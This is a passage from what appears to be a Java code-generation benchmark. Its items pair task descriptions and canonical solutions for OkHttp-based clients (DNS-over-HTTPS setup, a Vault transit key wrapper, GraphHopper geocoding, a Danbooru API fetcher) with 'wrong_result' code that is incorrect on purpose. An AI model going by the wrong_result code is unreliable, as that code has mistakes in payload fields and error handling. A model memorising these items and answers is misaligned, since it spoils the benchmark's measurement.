httpclientBuilder.proxy(Proxy.NO_PROXY);\n        Dns dns = Dns.SYSTEM;\n        try {\n            InetAddress[] cloudflareBootstrap = new InetAddress[]{InetAddress.getByName(\"162.159.36.1\"), InetAddress.getByName(\"162.159.46.1\"), InetAddress.getByName(\"1.1.1.1\"), InetAddress.getByName(\"1.0.0.1\"), InetAddress.getByName(\"162.159.132.53\"), InetAddress.getByName(\"2606:4700:4700::1111\"), InetAddress.getByName(\"2606:4700:4700::1001\"), InetAddress.getByName(\"2606:4700:4700::0064\"), InetAddress.getByName(\"2606:4700:4700::6400\")};\n            dns = s -> {\n                if (\"cloudflare-dns.com\".equals(s)) {\n                    return Arrays.asList(cloudflareBootstrap);\n                }\n                return Dns.SYSTEM.lookup(s);\n            };\n            httpclientBuilder.dns(dns);\n            dns = new DnsOverHttps.Builder().client(httpclientBuilder.build()).url(Objects.requireNonNull(HttpUrl.parse(\"https://cloudflare-dns.com/dns-query\"))).bootstrapDnsHosts(cloudflareBootstrap).resolvePrivateAddresses(true).build();\n        } catch (UnknownHostException | RuntimeException e) {\n            Timber.e(e, \"Failed to init DoH\");\n        }\n        fallbackDNS = new FallBackDNS(mainApplication, dns, \"github.com\", \"api.github.com\", \"raw.githubusercontent.com\", \"camo.githubusercontent.com\", \"user-images.githubusercontent.com\", \"cdn.jsdelivr.net\", \"img.shields.io\", \"magisk-modules-repo.github.io\", \"www.androidacy.com\", \"api.androidacy.com\", \"production-api.androidacy.com\");\n        httpclientBuilder.dns(Dns.SYSTEM);\n        httpClient = followRedirects(httpclientBuilder, true).build();\n        httpclientBuilder.dns(fallbackDNS);\n        httpClientDoH = followRedirects(httpclientBuilder, true).build();\n        httpclientBuilder.cache(new Cache(new File(mainApplication.getCacheDir(), \"http_cache\"), 16L * 1024L * 1024L));\n        httpclientBuilder.dns(Dns.SYSTEM);\n        httpClientWithCache = followRedirects(httpclientBuilder, true).build();\n        httpclientBuilder.dns(fallbackDNS);\n        httpClientWithCacheDoH = followRedirects(httpclientBuilder, true).build();\n        doh = MainApplication.isDohEnabled();\n    }\n\n    private static OkHttpClient.Builder followRedirects(OkHttpClient.Builder builder, boolean followRedirects) {\n        return builder.followRedirects(followRedirects).followSslRedirects(followRedirects);\n    }\n\n    public static OkHttpClient getHttpClient() {\n        return doh ? httpClientDoH : httpClient;\n    }\n\n    public static OkHttpClient getHttpClientWithCache() {\n        return doh ? httpClientWithCacheDoH : httpClientWithCache;\n    }\n\n    @SuppressLint(\"RestrictedApi\")\n    public static byte[] doHttpGet(String url, boolean allowCache) throws IOException {\n        Response response = (allowCache ? getHttpClientWithCache() : getHttpClient()).newCall(new Request.Builder().url(url).get().build()).execute();\n        if (response.code() != 200 && response.code() != 204 && (response.code() != 304 || !allowCache)) {\n            checkNeedCaptchaAndroidacy(url, response.code());\n            if (response.code() == 401 && AndroidacyUtil.isAndroidacyLink(url)) {\n                throw new HttpException(\"Androidacy token is invalid\", 401);\n            }\n            throw new HttpException(response.code());\n        }\n        ResponseBody responseBody = response.body();\n        if (response.code() == 304) {\n            response = response.cacheResponse();\n            if (response != null) responseBody = response.body();\n        }\n        return responseBody.bytes();\n    }\n\n    public static byte[] doHttpPost(String url, String data, boolean allowCache) throws IOException {\n        Response response = (allowCache ? getHttpClientWithCache() : getHttpClient()).newCall(new Request.Builder().url(url).post(JsonRequestBody.from(data)).header(\"Content-Type\", \"application/json\").build()).execute();\n        if (response.code() != 200 && response.code() != 204 && (response.code() != 304 || !allowCache)) {\n            checkNeedCaptchaAndroidacy(url, response.code());\n            throw new HttpException(response.code());\n        }\n        ResponseBody responseBody = response.body();\n        if (response.code() == 304) {\n            response = response.cacheResponse();\n            if (response != null) responseBody = response.body();\n        }\n        return responseBody.bytes();\n    }\n\n    private static void checkNeedCaptchaAndroidacy(String url, int errorCode) {\n        if (errorCode == 403 && AndroidacyUtil.isAndroidacyLink(url)) {\n            needCaptchaAndroidacyHost = Uri.parse(url).getHost();\n        }\n    }\n\n    private static class JsonRequestBody extends RequestBody {\n        private static final MediaType JSON_MEDIA_TYPE = MediaType.get(\"application/json\");\n        private static final JsonRequestBody EMPTY = new JsonRequestBody(new byte[0]);\n        final byte[] data;\n\n        private JsonRequestBody(byte[] data) {\n            this.data = data;\n        }\n\n        static JsonRequestBody from(String data) {\n            if (data == null || data.length() == 0) {\n                return EMPTY;\n            }\n            return new JsonRequestBody(data.getBytes(StandardCharsets.UTF_8));\n        }\n\n        @Override\n        public MediaType contentType() {\n            return JSON_MEDIA_TYPE;\n        }\n\n        @Override\n        public long contentLength() {\n            return this.data.length;\n        }\n\n        @Override\n        public void writeTo(@NonNull BufferedSink bufferedSink) throws IOException {\n            bufferedSink.write(this.data);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "```java\nimport okhttp3.*;\nimport okio.Buffer;\nimport java.io.File;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.concurrent.TimeUnit;\n\npublic class HttpClient {\n    private static OkHttpClient httpClient;\n    private static OkHttpClient httpClientDoH;\n    private static OkHttpClient httpClientWithCache;\n    private static OkHttpClient httpClientWithCacheDoH;\n    private static FallBackDNS fallbackDNS;\n    private static boolean doh = false;\n\n    static {\n        fallbackDNS = new FallBackDNS();\n\n        Cache cache = new Cache(new File(\"cache\"), 10 * 1024 * 1024);\n\n        httpClient = followRedirects(new OkHttpClient.Builder()\n                .connectTimeout(10, TimeUnit.SECONDS)\n                .readTimeout(30, TimeUnit.SECONDS)\n                .writeTimeout(15, TimeUnit.SECONDS)\n                .proxySelector(ProxySelector.getDefault())\n                .dns(fallbackDNS), true).build();\n\n        httpClientDoH = followRedirects(new OkHttpClient.Builder()\n                .connectTimeout(10, TimeUnit.SECONDS)\n                .readTimeout(30, TimeUnit.SECONDS)\n                .writeTimeout(15, TimeUnit.SECONDS)\n                .proxySelector(ProxySelector.getDefault())\n                .dns(new DnsOverHttps.Builder()\n                        .client(httpClient)\n                        .url(HttpUrl.get(\"https://dns.google/dns-query\"))\n                        .build()), true).build();\n\n        httpClientWithCache = followRedirects(new OkHttpClient.Builder()\n                .connectTimeout(10, TimeUnit.SECONDS)\n                .readTimeout(30, TimeUnit.SECONDS)\n                .writeTimeout(15, TimeUnit.SECONDS)\n                .proxySelector(ProxySelector.getDefault())\n                .dns(fallbackDNS)\n                .cache(cache), true).build();\n\n        httpClientWithCacheDoH = followRedirects(new OkHttpClient.Builder()\n                .connectTimeout(10, TimeUnit.SECONDS)\n                .readTimeout(30, TimeUnit.SECONDS)\n                .writeTimeout(15, TimeUnit.SECONDS)\n                .proxySelector(ProxySelector.getDefault())\n                .dns(new DnsOverHttps.Builder()\n                        .client(httpClientWithCache)\n                        .url(HttpUrl.get(\"https://dns.google/dns-query\"))\n                        .build())\n                .cache(cache), true).build();\n    }\n\n    public static OkHttpClient getHttpClient() {\n        return doh ? httpClientDoH : httpClient;\n    }\n\n    public static OkHttpClient getHttpClientWithCache() {\n        return doh ? httpClientWithCacheDoH : httpClientWithCache;\n    }\n\n    public static byte[] doHttpGet(String url, boolean allowCache) throws IOException {\n        Request request = new Request.Builder().url(url).get().build();\n        OkHttpClient client = allowCache ? getHttpClientWithCache() : getHttpClient();\n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n            return response.body().bytes();\n        }\n    }\n\n    public static byte[] doHttpPost(String url, String data, boolean allowCache) throws IOException {\n        RequestBody body = new JsonRequestBody(data);\n        Request request = new Request.Builder().url(url).post(body).build();\n        OkHttpClient client = allowCache ? getHttpClientWithCache() : getHttpClient();\n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n            return response.body().bytes();\n        }\n    }\n\n    public static OkHttpClient.Builder followRedirects(OkHttpClient.Builder builder, boolean followRedirects) {\n        return builder.followRedirects(followRedirects).followSslRedirects(followRedirects);\n    }\n\n    public static void checkNeedCaptchaAndroidacy(String url, int errorCode) {\n        // Placeholder for actual logic to determine CAPTCHA requirement\n    }\n\n    public static class JsonRequestBody extends RequestBody {\n        private final String json;\n\n        public JsonRequestBody(String json) {\n            this.json = json;\n        }\n\n        @Override\n        public MediaType contentType() {\n            return MediaType.get(\"application/json; charset=utf-8\");\n        }\n\n        @Override\n        public void writeTo(BufferedSink sink) throws IOException {\n            sink.writeUtf8(json);\n        }\n    }\n\n    public static class FallBackDNS implements Dns {\n        private final Dns defaultDns = Dns.SYSTEM;\n\n        @Override\n        public List<InetAddress> lookup(String hostname) throws UnknownHostException {\n            try {\n                return defaultDns.lookup(hostname);\n            } catch (UnknownHostException e) {\n                try {\n                    return Dns.SYSTEM.lookup(hostname);\n                } catch (UnknownHostException ex) {\n                    ex.addSuppressed(e);\n                    throw ex;\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 239,
    "Instruction": "Task Description: Implement a VaultClient class that interacts with a Vault server's transit engine to perform key wrapping and unwrapping operations for cryptographic purposes, using HTTP REST API calls.\n\nClass Description: The VaultClient class implements the KmsClient interface and provides functionality to encrypt (wrap) and decrypt (unwrap) keys using a Vault server's transit engine. It handles HTTP communication, request building, response processing, and error handling.\n\nAttributes:\n- LOG: Logger - Used for logging information and errors\n- JSON_MEDIA_TYPE: MediaType - Constant for JSON content type\n- objectMapper: ObjectMapper - Used for JSON serialization/deserialization\n- kmsToken: String - Authentication token for Vault server\n- hadoopConfiguration: Configuration - Hadoop configuration object\n- endPointPrefix: String - Base URL prefix for Vault API endpoints\n- httpClient: OkHttpClient - HTTP client for making requests\n\nMethods:\n- getContentFromTransitEngine(String, String, String) -> String - Sends a POST request to Vault's transit engine endpoint with the given payload and master key identifier\n- executeAndGetResponse(String, Request) -> String - Executes HTTP request and handles response, including error cases\n- buildPayload(Map<String, String>) -> String - Converts a parameter map to JSON string\n- wrapKey(byte[], String) -> String - Encrypts/wraps a key using the specified master key\n- unwrapKey(String, String) -> byte[] - Decrypts/unwraps a key using the specified master key\n- parseReturn(String, String) -> String - Parses the response from Vault to extract the required value\n- refreshToken() -> void - Refreshes the authentication token (implementation not shown in reference code)",
    "Canonical_solution": "import com.fasterxml.jackson.databind.ObjectMapper;\nimport java.io.IOException;\nimport java.util.Base64;\nimport java.util.HashMap;\nimport java.util.Map;\nimport okhttp3.ConnectionSpec;\nimport okhttp3.MediaType;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.RequestBody;\nimport okhttp3.Response;\nimport org.apache.hadoop.conf.Configuration;\nimport org.apache.parquet.crypto.KeyAccessDeniedException;\nimport org.apache.parquet.crypto.ParquetCryptoRuntimeException;\nimport org.apache.parquet.crypto.keytools.KeyToolkit;\nimport org.apache.parquet.crypto.keytools.KmsClient;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class VaultClient implements KmsClient {\n  private static final Logger LOG = LoggerFactory.getLogger(VaultClient.class);\n  private static final MediaType JSON_MEDIA_TYPE = MediaType.get(\"application/json; charset=utf-8\");\n  private static final ObjectMapper objectMapper = new ObjectMapper();\n\n  private String kmsToken;\n  private Configuration hadoopConfiguration;\n  private String endPointPrefix;\n  private OkHttpClient httpClient = new OkHttpClient.Builder()\n      .connectionSpecs(Arrays.asList(ConnectionSpec.MODERN_TLS, ConnectionSpec.COMPATIBLE_TLS))\n      .build();\n\n  private String getContentFromTransitEngine(String endPoint, String jPayload, String masterKeyIdentifier) {\n    LOG.info(\"masterKeyIdentifier: \" + masterKeyIdentifier);\n\n    final RequestBody requestBody = RequestBody.create(JSON_MEDIA_TYPE, jPayload);\n    Request request = new Request.Builder()\n        .url(endPoint + masterKeyIdentifier)\n        .header(\"X-Vault-Token\", kmsToken)\n        .post(requestBody)\n        .build();\n\n    return executeAndGetResponse(endPoint, request);\n  }\n\n  private String executeAndGetResponse(String endPoint, Request request) {\n    Response response = null;\n    try {\n      response = httpClient.newCall(request).execute();\n      final String responseBody = response.body().string();\n      if (response.isSuccessful()) {\n        return responseBody;\n      } else {\n        if ((401 == response.code()) || (403 == response.code())) {\n          throw new KeyAccessDeniedException(responseBody);\n        }\n        throw new IOException(\"Vault call [\" + endPoint + \"] didn't succeed: \" + responseBody);\n      }\n    } catch (IOException e) {\n      throw new ParquetCryptoRuntimeException(\n          \"Vault call [\" + request.url().toString() + endPoint + \"] didn't succeed\", e);\n    } finally {\n      if (null != response) {\n        response.close();\n      }\n    }\n  }\n\n  private String buildPayload(Map<String, String> paramMap) {\n    String jsonValue;\n    try {\n      jsonValue = objectMapper.writeValueAsString(paramMap);\n    } catch (IOException e) {\n      throw new ParquetCryptoRuntimeException(\"Failed to build payload\", e);\n    }\n    return jsonValue;\n  }\n\n  @Override\n  public String wrapKey(byte[] keyBytes, String masterKeyIdentifier) throws KeyAccessDeniedException {\n    refreshToken();\n    Map<String, String> writeKeyMap = new HashMap<String, String>(1);\n    final String dataKeyStr = Base64.getEncoder().encodeToString(keyBytes);\n    writeKeyMap.put(\"plaintext\", dataKeyStr);\n    String response = getContentFromTransitEngine(\n        endPointPrefix + \"encrypt/\", buildPayload(writeKeyMap), masterKeyIdentifier);\n    return parseReturn(response, \"ciphertext\");\n  }\n\n  @Override\n  public byte[] unwrapKey(String wrappedKey, String masterKeyIdentifier) throws KeyAccessDeniedException {\n    refreshToken();\n    Map<String, String> writeKeyMap = new HashMap<String, String>(1);\n    writeKeyMap.put(\"ciphertext\", wrappedKey);\n    String response = getContentFromTransitEngine(\n        endPointPrefix + \"decrypt/\", buildPayload(writeKeyMap), masterKeyIdentifier);\n    String plaintext = parseReturn(response, \"plaintext\");\n    return Base64.getDecoder().decode(plaintext);\n  }\n\n  private static String parseReturn(String response, String searchKey) {\n    String matchingValue;\n    try {\n      matchingValue = objectMapper.readTree(response).findValue(searchKey).textValue();\n    } catch (IOException e) {\n      throw new ParquetCryptoRuntimeException(\n          \"Failed to parse vault response. \" + searchKey + \" not found.\" + response, e);\n    }\n\n    if (null == matchingValue) {\n      throw new ParquetCryptoRuntimeException(\n          \"Failed to match vault response. \" + searchKey + \" not found.\" + response);\n    }\n    return matchingValue;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "```java\npublic class VaultClient implements KmsClient {\n    private static final Logger LOG = LoggerFactory.getLogger(VaultClient.class);\n    private static final MediaType JSON_MEDIA_TYPE = MediaType.get(\"application/json; charset=utf-8\");\n    private final ObjectMapper objectMapper = new ObjectMapper();\n    private String kmsToken;\n    private Configuration hadoopConfiguration;\n    private String endPointPrefix;\n    private OkHttpClient httpClient;\n\n    public VaultClient(Configuration hadoopConfiguration, String endPointPrefix) {\n        this.hadoopConfiguration = hadoopConfiguration;\n        this.endPointPrefix = endPointPrefix;\n        this.httpClient = new OkHttpClient();\n        this.kmsToken = getKmsTokenFromConfig();\n    }\n\n    private String getKmsTokenFromConfig() {\n        return hadoopConfiguration.get(\"vault.token\");\n    }\n\n    public String wrapKey(byte[] key, String masterKeyId) throws IOException {\n        Map<String, String> payload = new HashMap<>();\n        payload.put(\"value\", Base64.getEncoder().encodeToString(key));\n        String jsonPayload = buildPayload(payload);\n        String url = endPointPrefix + \"/transit/encrypt/\" + masterKeyId;\n        RequestBody body = RequestBody.create(jsonPayload, JSON_MEDIA_TYPE);\n        Request request = new Request.Builder()\n                .url(url)\n                .post(body)\n                .addHeader(\"X-Vault-Token\", kmsToken)\n                .build();\n        return executeAndGetResponse(masterKeyId, request);\n    }\n\n    public byte[] unwrapKey(String encryptedKey, String masterKeyId) throws IOException {\n        Map<String, String> payload = new HashMap<>();\n        payload.put(\"ciphertext\", encryptedKey);\n        String jsonPayload = buildPayload(payload);\n        String url = endPointPrefix + \"/transit/decrypt/\" + masterKeyId;\n        RequestBody body = RequestBody.create(jsonPayload, JSON_MEDIA_TYPE);\n        Request request = new Request.Builder()\n                .url(url)\n                .post(body)\n                .addHeader(\"X-Vault-Token\", kmsToken)\n                .build();\n        String response = executeAndGetResponse(masterKeyId, request);\n        String valueBase64 = parseReturn(response, \"plaintext\");\n        return Base64.getDecoder().decode(valueBase64);\n    }\n\n    private String getContentFromTransitEngine(String endpoint, String payloadJson, String masterKeyId) throws IOException {\n        String url = endPointPrefix + \"/transit/\" + endpoint + \"/\" + masterKeyId;\n        RequestBody body = RequestBody.create(payloadJson, JSON_MEDIA_TYPE);\n        Request request = new Request.Builder()\n                .url(url)\n                .post(body)\n                .addHeader(\"X-Vault-Token\", kmsToken)\n                .build();\n        return executeAndGetResponse(masterKeyId, request);\n    }\n\n    private String executeAndGetResponse(String masterKeyId, Request request) throws IOException {\n        try (Response response = httpClient.newCall(request).execute()) {\n            if (!response.isSuccessful()) {\n                throw new IOException(\"Unexpected code \" + response);\n            }\n            ResponseBody responseBody = response.body();\n            if (responseBody == null) {\n                throw new IOException(\"Empty response body for master key: \" + masterKeyId);\n            }\n            return responseBody.string();\n        } catch (IOException e) {\n            LOG.error(\"Error executing HTTP request for master key: {}\", masterKeyId, e);\n            throw e;\n        }\n    }\n\n    private String buildPayload(Map<String, String> parameters) throws JsonProcessingException {\n        return objectMapper.writeValueAsString(parameters);\n    }\n\n    private String parseReturn(String responseJson, String fieldName) throws IOException {\n        JsonNode rootNode = objectMapper.readTree(responseJson);\n        JsonNode dataNode = rootNode.path(\"data\");\n        if (dataNode.isMissingNode()) {\n            throw new IOException(\"Missing 'data' field in Vault response\");\n        }\n        JsonNode resultNode = dataNode.path(fieldName);\n        if (resultNode.isMissingNode()) {\n            throw new IOException(\"Missing '\" + fieldName + \"' field in Vault response\");\n        }\n        return resultNode.asText();\n    }\n\n    public void refreshToken() {\n        // Implementation not shown\n    }\n}\n```"
  },
  {
    "Task_id": 242,
    "Instruction": "Task Description: Create a Java class that implements geocoding functionality using the GraphHopper API, allowing both forward and reverse geocoding operations through HTTP requests.\n\nClass Description: The GraphHopperGeocoding class provides methods to perform geocoding operations by communicating with the GraphHopper API service. It handles HTTP client configuration, request building, response processing, and error handling.\n\nAttributes:\n- objectMapper: ObjectMapper - Used for JSON serialization/deserialization\n- downloader: OkHttpClient - HTTP client for making requests\n- routeServiceUrl: String - Base URL for the GraphHopper geocoding API\n- key: String - API key for authentication\n- DEFAULT_TIMEOUT: long - Default timeout value for HTTP requests (5000ms)\n\nMethods:\n- GraphHopperGeocoding() -> Constructor - Initializes with default GraphHopper API URL\n- GraphHopperGeocoding(String serviceUrl) -> Constructor - Initializes with custom service URL\n- geocode(GHGeocodingRequest request) -> GHGeocodingResponse - Performs geocoding operation based on request parameters\n- setDownloader(OkHttpClient downloader) -> GraphHopperGeocoding - Sets custom HTTP client\n- setKey(String key) -> void - Sets API key for authentication\n- getDownloader() -> OkHttpClient - Returns current HTTP client instance\n- getClientForRequest(GHGeocodingRequest request) -> OkHttpClient - Returns configured HTTP client with appropriate timeout\n- buildUrl(GHGeocodingRequest request) -> String - Constructs API request URL with proper parameters\n- encodeURL(String str) -> String - URL-encodes string parameters (private helper method)",
    "Canonical_solution": "import com.fasterxml.jackson.databind.ObjectMapper;\nimport com.graphhopper.api.model.GHGeocodingRequest;\nimport com.graphhopper.api.model.GHGeocodingResponse;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport okhttp3.ResponseBody;\n\nimport java.io.IOException;\nimport java.io.UnsupportedEncodingException;\nimport java.net.URLEncoder;\nimport java.util.concurrent.TimeUnit;\n\nimport static com.graphhopper.api.GraphHopperWeb.X_GH_CLIENT_VERSION;\nimport static com.graphhopper.api.Version.GH_VERSION_FROM_MAVEN;\n\npublic class GraphHopperGeocoding {\n\n    private final ObjectMapper objectMapper;\n    private OkHttpClient downloader;\n    private String routeServiceUrl;\n    private String key = \"\";\n    private final long DEFAULT_TIMEOUT = 5000;\n\n    public GraphHopperGeocoding() {\n        this(\"https://graphhopper.com/api/1/geocode\");\n    }\n\n    public GraphHopperGeocoding(String serviceUrl) {\n        this.routeServiceUrl = serviceUrl;\n        downloader = new OkHttpClient.Builder().\n                connectTimeout(DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS).\n                readTimeout(DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS).\n                build();\n        objectMapper = new ObjectMapper();\n    }\n\n    public GHGeocodingResponse geocode(GHGeocodingRequest request) {\n        String url = buildUrl(request);\n        try {\n            Request okRequest = new Request.Builder().url(url)\n                    .header(X_GH_CLIENT_VERSION, GH_VERSION_FROM_MAVEN)\n                    .build();\n            Response rsp = getClientForRequest(request).newCall(okRequest).execute();\n            ResponseBody rspBody = rsp.body();\n            if (!rsp.isSuccessful())\n                throw new RuntimeException(rspBody.string());\n            GHGeocodingResponse geoRsp = objectMapper.readValue(rspBody.bytes(), GHGeocodingResponse.class);\n            return geoRsp;\n        } catch (IOException ex) {\n            throw new RuntimeException(\"IO problem for geocoding URL \" + url + \": \" + ex.getMessage(), ex);\n        }\n    }\n\n    public GraphHopperGeocoding setDownloader(OkHttpClient downloader) {\n        this.downloader = downloader;\n        return this;\n    }\n\n    public void setKey(String key) {\n        this.key = key;\n    }\n\n    public OkHttpClient getDownloader() {\n        return downloader;\n    }\n\n    private OkHttpClient getClientForRequest(GHGeocodingRequest request) {\n        OkHttpClient client = this.downloader;\n        if (request.hasTimeout()) {\n            long timeout = request.getTimeout();\n            client = client.newBuilder()\n                    .connectTimeout(timeout, TimeUnit.MILLISECONDS)\n                    .readTimeout(timeout, TimeUnit.MILLISECONDS)\n                    .build();\n        }\n        return client;\n    }\n\n    private String buildUrl(GHGeocodingRequest request) {\n        String url = routeServiceUrl + \"?\";\n        if (request.isReverse()) {\n            if (!request.getPoint().isValid())\n                throw new IllegalArgumentException(\"For reverse geocoding you have to pass valid lat and long values\");\n            url += \"reverse=true\";\n        } else {\n            if (request.getQuery() == null)\n                throw new IllegalArgumentException(\"For forward geocoding you have to a string for the query\");\n            url += \"reverse=false\";\n            url += \"&q=\" + encodeURL(request.getQuery());\n        }\n\n        if (request.getPoint().isValid())\n            url += \"&point=\" + request.getPoint().getLat() + \",\" + request.getPoint().getLon();\n\n        url += \"&limit=\" + request.getLimit();\n        url += \"&locale=\" + encodeURL(request.getLocale());\n        url += \"&provider=\" + encodeURL(request.getProvider());\n\n        if (!key.isEmpty()) {\n            url += \"&key=\" + encodeURL(key);\n        }\n        return url;\n    }\n\n    private static String encodeURL(String str) {\n        try {\n            return URLEncoder.encode(str, \"UTF-8\");\n        } catch (UnsupportedEncodingException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "```java\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport okhttp3.*;\nimport java.io.IOException;\nimport java.net.URLEncoder;\nimport java.nio.charset.StandardCharsets;\nimport java.util.concurrent.TimeUnit;\n\npublic class GraphHopperGeocoding {\n    private final ObjectMapper objectMapper = new ObjectMapper();\n    private OkHttpClient downloader;\n    private String routeServiceUrl = \"https://graphhopper.com/api/1/\";\n    private String key;\n    private static final long DEFAULT_TIMEOUT = 5000;\n\n    public GraphHopperGeocoding() {\n        this.downloader = new OkHttpClient.Builder()\n                .connectTimeout(DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS)\n                .readTimeout(DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS)\n                .build();\n    }\n\n    public GraphHopperGeocoding(String serviceUrl) {\n        this.routeServiceUrl = serviceUrl;\n        this.downloader = new OkHttpClient.Builder()\n                .connectTimeout(DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS)\n                .readTimeout(DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS)\n                .build();\n    }\n\n    public GHGeocodingResponse geocode(GHGeocodingRequest request) throws IOException {\n        String url = buildUrl(request);\n        Request httpRequest = new Request.Builder().url(url).build();\n        try (Response response = getClientForRequest(request).newCall(httpRequest).execute()) {\n            if (!response.isSuccessful()) {\n                throw new IOException(\"Unexpected code \" + response);\n            }\n            return objectMapper.readValue(response.body().string(), GHGeocodingResponse.class);\n        }\n    }\n\n    public GraphHopperGeocoding setDownloader(OkHttpClient downloader) {\n        this.downloader = downloader;\n        return this;\n    }\n\n    public void setKey(String key) {\n        this.key = key;\n    }\n\n    public OkHttpClient getDownloader() {\n        return downloader;\n    }\n\n    protected OkHttpClient getClientForRequest(GHGeocodingRequest request) {\n        OkHttpClient client = downloader.newBuilder()\n                .connectTimeout((int) DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS)\n                .readTimeout((int) DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS)\n                .build();\n        return client;\n    }\n\n    protected String buildUrl(GHGeocodingRequest request) {\n        StringBuilder sb = new StringBuilder(routeServiceUrl);\n        sb.append(\"geocode\").append(\"?key=\").append(key);\n\n        if (request.getQuery() != null && !request.getQuery().isEmpty()) {\n            sb.append(\"&q=\").append(encodeURL(request.getQuery()));\n        }\n        if (request.isReverse()) {\n            sb.append(\"&reverse=true\");\n        }\n        if (request.getLimit() > 0) {\n            sb.append(\"&limit=\").append(request.getLimit());\n        }\n        if (request.getPoint() != null) {\n            sb.append(\"&point=\").append(encodeURL(request.getPoint()));\n        }\n        return sb.toString();\n    }\n\n    private String encodeURL(String str) {\n        return URLEncoder.encode(str, StandardCharsets.UTF_8);\n    }\n}\n```"
  },
  {
    "Task_id": 243,
    "Instruction": "Task Description: Create a Java class that interacts with the Danbooru API to fetch and process image posts, including retrieving pages of posts, extracting image URLs, and parsing tags from URLs.\n\nClass Description: The DanbooruApiClient class provides functionality to interact with the Danbooru image board API. It handles HTTP requests to fetch posts, processes JSON responses, and extracts relevant information from URLs.\n\nAttributes:\n- DOMAIN: [String] - The domain name of the Danbooru service\n- client: [OkHttpClient] - HTTP client instance for making requests\n- gidPattern: [Pattern] - Regular expression pattern for parsing tags from URLs\n- currentPageNum: [int] - Tracks the current page number for pagination\n\nMethods:\n- Constructor: DanbooruApiClient() -> [void] - Initializes the HTTP client with timeout settings\n- getPage: [int pageNum] -> [JSONObject] - Fetches a page of posts from Danbooru API with the specified page number, returns posts as JSON object\n- extractUrlsFromJson: [JSONObject json] -> [List<String>] - Extracts image URLs from the JSON response and returns them as a list\n- getTagFromUrl: [URL url] -> [String] - Parses and returns the tag component from a Danbooru URL, throws MalformedURLException if URL format is invalid",
    "Canonical_solution": "import com.rarchives.ripme.utils.Utils;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport org.json.JSONArray;\nimport org.json.JSONObject;\n\nimport java.io.IOException;\nimport java.net.MalformedURLException;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.net.URL;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.TimeUnit;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\npublic class DanbooruApiClient {\n    private static final String DOMAIN = \"danbooru.donmai.us\";\n    private final OkHttpClient client;\n    private Pattern gidPattern = null;\n    private int currentPageNum = 1;\n\n    public DanbooruApiClient() {\n        this.client = new OkHttpClient.Builder()\n                .readTimeout(60, TimeUnit.SECONDS)\n                .writeTimeout(60, TimeUnit.SECONDS)\n                .build();\n    }\n\n    public JSONObject getPage(int pageNum) throws MalformedURLException {\n        Request request = new Request.Builder()\n                .url(\"https://\" + DOMAIN + \"/posts.json?page=\" + pageNum)\n                .header(\"User-Agent\", \"Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1\")\n                .header(\"Accept\", \"application/json,text/javascript,*/*;q=0.01\")\n                .header(\"Accept-Language\", \"en-US,en;q=0.9\")\n                .header(\"Sec-Fetch-Dest\", \"empty\")\n                .header(\"Sec-Fetch-Mode\", \"cors\")\n                .header(\"Sec-Fetch-Site\", \"same-origin\")\n                .header(\"Referer\", \"https://danbooru.donmai.us/\")\n                .header(\"X-Requested-With\", \"XMLHttpRequest\")\n                .header(\"Connection\", \"keep-alive\")\n                .build();\n\n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n\n            String responseData = response.body().string();\n            JSONArray jsonArray = new JSONArray(responseData);\n            if (!jsonArray.isEmpty()) {\n                return new JSONObject(\"{ \\\"resources\\\":\" + jsonArray + \" }\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    public List<String> extractUrlsFromJson(JSONObject json) {\n        List<String> res = new ArrayList<>(100);\n        JSONArray jsonArray = json.getJSONArray(\"resources\");\n        for (int i = 0; i < jsonArray.length(); i++) {\n            if (jsonArray.getJSONObject(i).has(\"file_url\")) {\n                res.add(jsonArray.getJSONObject(i).getString(\"file_url\"));\n            }\n        }\n        return res;\n    }\n\n    public String getTagFromUrl(URL url) throws MalformedURLException {\n        gidPattern = Pattern.compile(\"https?://danbooru.donmai.us/(posts)?.*([?&]tags=([^&]*)(?:&z=([0-9]+))?$)\");\n        Matcher m = gidPattern.matcher(url.toExternalForm());\n\n        if (m.matches()) {\n            return m.group(3);\n        }\n\n        throw new MalformedURLException(\"Expected danbooru URL format: \" + DOMAIN + \"/posts?tags=searchterm - got \" + url + \" instead\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
